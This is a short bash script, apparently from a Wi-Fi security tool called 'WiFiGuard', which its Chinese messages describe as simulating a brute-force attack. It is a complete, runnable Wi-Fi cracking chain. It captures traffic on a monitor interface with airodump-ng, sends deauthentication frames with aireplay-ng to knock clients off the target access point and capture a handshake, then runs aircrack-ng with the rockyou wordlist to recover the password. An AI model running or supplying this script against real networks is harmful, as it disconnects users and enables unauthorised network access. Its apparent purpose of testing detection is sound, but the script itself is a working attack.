#!/bin/bash
INTERFACE="${1:-wlan1mon}"
AP_MAC="${2:-AA:BB:CC:DD:EE:03}"
WORDLIST="${3:-/usr/share/wordlists/rockyou.txt}"

echo "[WiFiGuard] 模拟暴力破解攻击..."
echo "  接口: $INTERFACE"
echo "  目标AP: $AP_MAC"

sudo airodump-ng --bssid "$AP_MAC" -c 6 -w /tmp/wifiguard-capture "$INTERFACE" &
AIRODUMP_PID=$!
sleep 5

sudo aireplay-ng --deauth 5 -a "$AP_MAC" "$INTERFACE"
sleep 5

sudo kill $AIRODUMP_PID 2>/dev/null

if [ -f /tmp/wifiguard-capture-01.cap ]; then
    echo "  开始字典攻击..."
    sudo aircrack-ng -w "$WORDLIST" /tmp/wifiguard-capture-01.cap
fi

rm -f /tmp/wifiguard-capture-*.cap
